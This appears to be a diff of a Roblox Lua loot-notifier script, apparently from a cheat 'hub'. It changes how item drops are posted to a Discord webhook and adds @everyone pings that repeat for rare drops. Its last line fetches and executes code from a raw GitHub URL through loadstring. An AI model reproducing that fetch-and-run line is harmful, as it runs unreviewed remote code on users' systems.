@@ -5,7 +5,7 @@ end
 
 -- Services
 local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
+local HttpService = game:GetService("HttpService") 
 
 -- Constants
 local RARITY_COLORS = {
@@ -125,14 +125,26 @@ local function SendDiscordEmbed(playerName, items, isGreggBoss)
         return
     end
 
+    local hasSpecialDrop = false
     local lootList = ""
+    
+    -- Check for special drops and build loot list
     for _, item in ipairs(items) do
-        lootList = lootList .. "Loot Got: " .. item.name .. " [" .. item.rarity .. "]\n"
+        if ULTIMATE_WEAPONS[item.name] or LEGENDARY_WEAPONS[item.name] then
+            hasSpecialDrop = true
+            lootList = lootList .. "**SPECIAL DROP!** " .. item.name .. " [" .. item.rarity .. "]\n"
+        else
+            lootList = lootList .. "Loot Got: " .. item.name .. " [" .. item.rarity .. "]\n"
+        end
     end
     
+    -- Add @everyone mention for special drops
+    local content = hasSpecialDrop and "@everyone **LEGENDARY/ULTIMATE DROP!**" or ""
+    
     local data = {
+        ["content"] = content,
         ["embeds"] = {{
-            ["title"] = "NSHUB Loot Notifier",
+            ["title"] = "Dungeon Loot Notifier",
             ["description"] = lootList,
             ["color"] = getEmbedColor(items, isGreggBoss),
             ["footer"] = {
@@ -140,14 +152,6 @@ local function SendDiscordEmbed(playerName, items, isGreggBoss)
             }
         }}
     }
-
-    local hasSpecialDrop = false
-    for _, item in ipairs(items) do
-        if ULTIMATE_WEAPONS[item.name] or LEGENDARY_WEAPONS[item.name] then
-            hasSpecialDrop = true
-            break
-        end
-    end
     
     if hasSpecialDrop then
         for i = 1, 10 do
@@ -501,5 +505,5 @@ end
 
 executeAutoMenu()
 
--- Load external script with specific URL
+-- You can add your loadstring URL here
 loadstring(game:HttpGet("https://raw.githubusercontent.com/hen56s2/main2/refs/heads/main/2"))()
